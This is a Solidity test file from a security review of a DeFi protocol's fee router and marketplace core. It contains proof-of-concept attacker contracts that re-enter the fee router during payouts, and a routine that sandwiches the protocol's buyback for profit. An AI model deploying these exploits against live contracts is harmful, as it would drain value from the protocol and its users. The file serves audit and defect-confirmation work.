// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {FixedPointMathLib} from "solady/utils/FixedPointMathLib.sol";
import {ICore} from "../src/interfaces/ICore.sol";
import {IFeeRouter} from "../src/interfaces/IFeeRouter.sol";
import {Lane, Mainnet, Settings} from "../src/interfaces/Interfaces.sol";
import {SeaportBase} from "./Seaport.t.sol";
import {FeeBase} from "./Fees.t.sol";
import {OrderComponents} from "./utils/SeaportTypes.sol";

/// independent review of the v2 port (docs/REVIEW-v2port.md). `test_FINDING_*` asserts a real defect as it behaves
/// today and passes today. `test_OK_*` confirms a property that holds. real contracts on the pinned fork, attacker
/// contracts only where a third party needs code

/// a seller side contract that flushes the fee router when Seaport pays it, i.e. inside the Core's measured call
contract FlushingPayee {
    IFeeRouter public immutable ROUTER;
    bool public armed;
    uint256 public flushedTips;

    constructor(address router_) {
        ROUTER = IFeeRouter(payable(router_));
    }

    function arm() external {
        armed = true;
    }

    receive() external payable {
        if (armed) {
            armed = false;
            uint256 b = address(this).balance;
            ROUTER.flush();
            flushedTips = address(this).balance - b;
        }
    }
}

/// F1. a stranger flushes the fee router in the middle of `buyListing`. the router balance is the engine's own queued fee
/// eth, so the attacker pays nothing for it, unlike a swap or an escrow claim (the cases the existing tests cover)
contract ReviewSeaportFlushTest is SeaportBase {
    using FixedPointMathLib for uint256;

    uint256 internal constant TARGET_RATE = 1e15;

    function setUp() public override {
        super.setUp();
        Settings memory cs = core.settings();
        cs.rateCap = uint64(TARGET_RATE);
        _setSettings(cs);
        _fundPot(30 ether);
        for (uint256 i; i < 900 && core.ethRate() < TARGET_RATE; ++i) {
            _warp(1 hours);
        }
        assertGe(core.ethRate(), TARGET_RATE);
    }

    /// leaves `eth` of buy volume worth of fees in the router (the hook pushed them, nobody flushed yet)
    function _queueFees(uint256 buyEth) internal returns (uint256 held) {
        autoFlush = false;
        _buyCoin(funder, buyEth);
        autoFlush = true;
        held = address(feeRouter).balance;
    }

    /// the maker lists at exactly the ceiling (no savings, so no tip is due) with a one wei second recipient that is
    /// the attacker contract. returns the data for the door
    function _order(uint256 id, uint256 price, FlushingPayee atk) internal returns (bytes memory) {
        OrderComponents memory c = _open(id, price - 1, 1);
        c.consideration[1].recipient = payable(address(atk));
        return _basicData(c);
    }

    function test_FINDING_strangerFlushInsideBuyListingLowersCostBasisAndPaysASelfDealTip() public {
        uint256 held = _queueFees(1.5 ether);
        uint256 id = _list();
        uint256 price = core.ceilingOf(id);
        assertGt(held, 0.05 ether);
        assertLt(held, price / 3, "the queued fees stay under the price");
        FlushingPayee atk = new FlushingPayee(address(feeRouter));
        atk.arm();
        bytes memory data = _order(id, price, atk);

        uint256 pot0 = core.ethPot();
        uint256 bal0 = address(core).balance;
        uint256 maker0 = maker.balance;
        vm.prank(maker);
        core.buyListing(price, data, id, Mainnet.SEAPORT);

        (,, uint256 booked,) = core.creditInfo(id);
        uint256 tip = maker.balance - maker0 - (price - 1);
        // eth the flush put into the Core during the call: balance after = before - price + flushed - tip
        uint256 flushed = address(core).balance + price + tip - bal0;
        emit log_named_uint("price", price);
        emit log_named_uint("queued fees flushed mid call", flushed);
        emit log_named_uint("buyListing tip", tip);
        emit log_named_uint("recorded cost basis", booked - tip);
        // the order was at the ceiling: with an honest measurement there is no savings and no tip
        assertGt(tip, 0, "FINDING: a tip is paid on a purchase at the ceiling");
        assertLt(booked - tip, price - 1, "FINDING: the cost basis is below the price the seller was paid");
        assertEq(core.ethPot(), pot0 - booked, "the pot paid the understated cost plus the tip");
        assertGt(flushed, held * 99 / 100, "what the flush delivered is what lowered the cost");
        assertEq(booked - tip, price - flushed, "cost basis = price - the flushed fees (the fees paid for the credit)");
        assertEq(address(core).balance, core.ethPot() + core.ethToBuyback(), "pots stay consistent: only the tip left");
        // the sell door pays exactly the ceiling for the same credit, so the maker side now beats the door
        assertGt(maker.balance - maker0 + 1, price, "FINDING: self dealing through the door beats the sell door");
    }

    function test_OK_theSameOrderWithAnEmptyRouterPaysNoTip() public {
        uint256 id = _list();
        uint256 price = core.ceilingOf(id);
        FlushingPayee atk = new FlushingPayee(address(feeRouter));
        atk.arm();
        bytes memory data = _order(id, price, atk);
        assertEq(address(feeRouter).balance, 0);
        uint256 maker0 = maker.balance;
        vm.prank(maker);
        core.buyListing(price, data, id, Mainnet.SEAPORT);
        (,, uint256 booked,) = core.creditInfo(id);
        assertEq(maker.balance - maker0, price - 1, "no tip at the ceiling");
        assertEq(booked, price, "the cost basis is the price");
    }
}

/// F2. the buyback has no min out. FLOW 10.1 and ARCHITECTURE item 17 say a sandwich of a 1 or 5 eth slice loses money after
/// both skims. at the v2 skim of 6.9 points that holds at the 1 eth launch slice and fails at the 5 eth cap (the
/// engineer relaxed `test_FIXED_buybackSliceCapStopsTheSandwich` instead of the claim)
contract ReviewSandwichTest is FeeBase {
    function _sandwich(uint256 slice, uint256 mult) internal returns (int256 net) {
        uint256 snap = vm.snapshotState();
        vm.deal(address(core), address(core).balance + slice);
        vm.store(address(core), bytes32(uint256(7)), bytes32(slice));
        assertEq(core.ethToBuyback(), slice, "slot 7 is ethToBuyback");
        Settings memory s = core.settings();
        s.buybackSlice = uint128(slice);
        s.buybackDelay = 1;
        _setSettings(s);
        vm.roll(block.number + 100);
        address mev = _user("mev");
        uint256 front = slice * mult;
        uint256 got = _buyCoin(mev, front);
        vm.prank(keeper);
        core.buyback();
        uint256 back = _sellCoin(mev, got);
        net = int256(back) - int256(front);
        vm.revertToState(snap);
    }

    function test_FINDING_sandwichOfTheFiveEthSliceProfitsAtTheLaunchSkim() public {
        _skipToSplitStart();
        uint256[6] memory m = [uint256(1), 2, 3, 4, 6, 8];
        int256 best1 = type(int256).min;
        int256 best5 = type(int256).min;
        for (uint256 i; i < 6; ++i) {
            int256 a = _sandwich(1 ether, m[i]);
            int256 b = _sandwich(5 ether, m[i]);
            emit log_named_int(string.concat("1 eth slice, front x", vm.toString(m[i])), a);
            emit log_named_int(string.concat("5 eth slice, front x", vm.toString(m[i])), b);
            if (a > best1) best1 = a;
            if (b > best5) best5 = b;
        }
        for (uint256 sl = 2; sl <= 4; ++sl) {
            int256 best = type(int256).min;
            for (uint256 i; i < 6; ++i) {
                int256 r = _sandwich(sl * 1 ether, m[i]);
                if (r > best) best = r;
            }
            emit log_named_int(string.concat("best net, slice ", vm.toString(sl), " eth"), best);
        }
        assertLt(best1, 0, "OK: the 1 eth launch slice cannot be sandwiched for a profit");
        assertGt(best5, 0, "FINDING: the 5 eth slice (the settings bound) can be sandwiched for a profit");
    }
}

/// a payee that does real work on receipt (a splitter: three cold storage writes, about 70k gas)
contract HeavyPayee {
    uint256 public a;
    uint256 public b;
    uint256 public got;

    receive() external payable {
        got += msg.value;
        a = 1;
        b = 1;
    }
}

/// F3. anyone chooses the gas of `flush`
contract ReviewRouterGasTest is FeeBase {
    HeavyPayee internal heavy;

    function setUp() public override {
        super.setUp();
        heavy = new HeavyPayee();
        _skipToSplitStart();
        autoFlush = false;
        _buyCoin(trader, 3 ether);
        _flush(); // the first flush at the start turns the split on
        assertTrue(feeRouter.splitOn());
        address[] memory who = new address[](1);
        who[0] = address(heavy);
        uint32[] memory ppm = new uint32[](1);
        ppm[0] = 161_030;
        vm.prank(owner);
        feeRouter.setPayees(who, ppm);
    }

    function _tryFlush(uint256 g) internal returns (bool ok) {
        vm.prank(flusher);
        (ok,) = address(feeRouter).call{gas: g}(abi.encodeCall(IFeeRouter.flush, ()));
    }

    function test_OK_aNormalFlushPaysTheHeavyPayeeDirectly() public {
        _buyCoin(trader, 3 ether);
        assertTrue(_tryFlush(1_000_000));
        assertGt(heavy.got(), 0, "paid within the 100k cap");
        assertEq(feeRouter.owed(address(heavy)), 0);
    }

    /// the flusher picks the gas limit. starving the payee call burns the 63/64 it was given, which leaves too little
    /// for the engine call, so the flush reverts as a whole: there is no gas limit at which the flush passes and the payee
    /// is credited instead of paid
    function test_OK_noGasLimitDivertsAPayeeIntoOwedWhileTheFlushPasses() public {
        _buyCoin(trader, 3 ether);
        uint256 snap = vm.snapshotState();
        uint256 passes;
        for (uint256 g = 100_000; g <= 400_000; g += 2_500) {
            if (_tryFlush(g)) {
                ++passes;
                assertEq(feeRouter.owed(address(heavy)), 0, "a passing flush paid the payee");
                assertGt(heavy.got(), 0);
            } else {
                assertEq(heavy.got(), 0, "a reverted flush paid nothing");
            }
            vm.revertToState(snap);
        }
        assertGt(passes, 0);
    }
}

/// calls a Core door and flushes the router once from its own `receive`, i.e. from inside the payout the door makes last
contract FlushOnPayout {
    IFeeRouter public immutable ROUTER;
    bool public armed;

    constructor(address router_) {
        ROUTER = IFeeRouter(payable(router_));
    }

    function go(address target, bytes calldata data) external {
        armed = true;
        (bool ok, bytes memory why) = target.call(data);
        if (!ok) {
            assembly ("memory-safe") {
                revert(add(why, 0x20), mload(why))
            }
        }
    }

    function approveAll(address nft, address op) external {
        (bool ok,) = nft.call(abi.encodeWithSignature("setApprovalForAll(address,bool)", op, true));
        require(ok);
    }

    receive() external payable {
        if (armed) {
            armed = false;
            ROUTER.flush();
        }
    }
}

/// F4. a stranger flushes the router from inside the payout of every door that pays the caller. the doors pay last, so
/// the booking lands on final state and the books stay exact
contract ReviewFlushInPayoutTest is FeeBase {
    FlushOnPayout internal atk;

    function setUp() public override {
        super.setUp();
        atk = new FlushOnPayout(address(feeRouter));
        _stock();
        autoFlush = false;
    }

    function _queue() internal returns (uint256 held) {
        _buyCoin(trader, 4 ether);
        held = address(feeRouter).balance;
        assertGt(held, 0.1 ether);
    }

    function _consistent() internal view {
        assertEq(address(core).balance, core.ethPot() + core.ethToBuyback(), "every wei is booked");
        assertEq(address(feeRouter).balance, 0, "the router was flushed");
    }

    function test_OK_flushInsideTheComposeReimbursement() public {
        autoFlush = true;
        _composeOnce(); // fills the pile and composes once; the state before is kept
        vm.revertToState(preComposeSnap);
        autoFlush = false;
        vm.fee(composeBasefee);
        _queue();
        uint256 pot0 = core.ethPot();
        (uint256 tip,, uint256 toEngine) = _routerSplit(address(feeRouter).balance);
        uint256 a0 = address(atk).balance;
        atk.go(address(core), abi.encodeCall(ICore.compose, ()));
        uint256 r = address(atk).balance - a0 - tip; // the reimbursement; the rest of the balance is the flush tip
        assertGt(r, 0);
        assertEq(core.ethPot(), pot0 - r + toEngine, "pot = old - reimbursement + the booked fees");
        _consistent();
    }

    function test_OK_flushInsideTheBuybackTip() public {
        _fillEthBuyback();
        vm.roll(block.number + 30);
        _queue();
        uint256 bb0 = core.ethToBuyback();
        uint256 pot0 = core.ethPot();
        atk.go(address(core), abi.encodeCall(ICore.buyback, ()));
        assertLt(core.ethToBuyback(), bb0, "the slice left the buyback pot");
        assertGt(core.ethPot(), pot0, "the flushed fees were booked on top");
        _consistent();
    }

    function test_OK_flushInsideTheSellForEthPayout() public {
        autoFlush = true;
        _fundPot(3 ether);
        autoFlush = false;
        uint256[] memory ids = _credits(address(atk), 1);
        atk.approveAll(address(CREDITS), address(core));
        _queue();
        uint256 pot0 = core.ethPot();
        (uint256 tip,, uint256 toEngine) = _routerSplit(address(feeRouter).balance);
        uint256 a0 = address(atk).balance;
        atk.go(address(core), abi.encodeWithSignature("sellForEth(uint256[])", ids));
        assertEq(CREDITS.ownerOf(ids[0]), address(core));
        uint256 price = address(atk).balance - a0 - tip;
        assertGt(price, 0);
        assertEq(core.ethPot(), pot0 - price + toEngine, "pot = old - price + the booked fees");
        _consistent();
    }
}
